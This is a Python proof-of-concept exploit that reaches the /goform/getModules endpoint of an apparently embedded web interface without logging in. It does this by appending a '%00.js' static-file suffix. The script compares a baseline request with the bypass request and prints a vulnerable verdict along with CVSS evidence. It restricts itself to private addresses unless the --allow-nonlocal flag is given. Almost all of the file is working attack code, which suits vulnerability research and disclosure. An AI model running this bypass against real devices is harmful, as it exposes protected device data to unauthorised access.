#!/usr/bin/env python3
"""
PoC: unauthenticated access to /goform/getModules via %00 static-suffix bypass.
"""

import argparse
import ipaddress
import socket
import sys
import urllib.error
import urllib.parse
import urllib.request


def require_private_target(base_url, allow_nonlocal):
    host = urllib.parse.urlparse(base_url).hostname
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def get(base_url, path):
    req = urllib.request.Request(base_url.rstrip("/") + path, method="GET")
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=5) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18080")
    parser.add_argument("--module", default="systemStatus")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    require_private_target(args.target, args.allow_nonlocal)
    baseline_path = f"/goform/getModules?modules={urllib.parse.quote(args.module)}"
    bypass_path = f"/goform/getModules%00.js?modules={urllib.parse.quote(args.module)}"
    baseline_status, baseline_body = get(args.target, baseline_path)
    bypass_status, bypass_body = get(args.target, bypass_path)

    vulnerable = baseline_status == 200 and '"errCode":1000' in baseline_body and bypass_status == 200 and '"errCode":1000' not in bypass_body
    print(f"[baseline] GET {baseline_path}")
    print(f"  status={baseline_status} body={baseline_body}")
    print(f"[exploit] GET {bypass_path}")
    print(f"  status={bypass_status} body={bypass_body}")
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N; read API auth gate bypassed")
    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
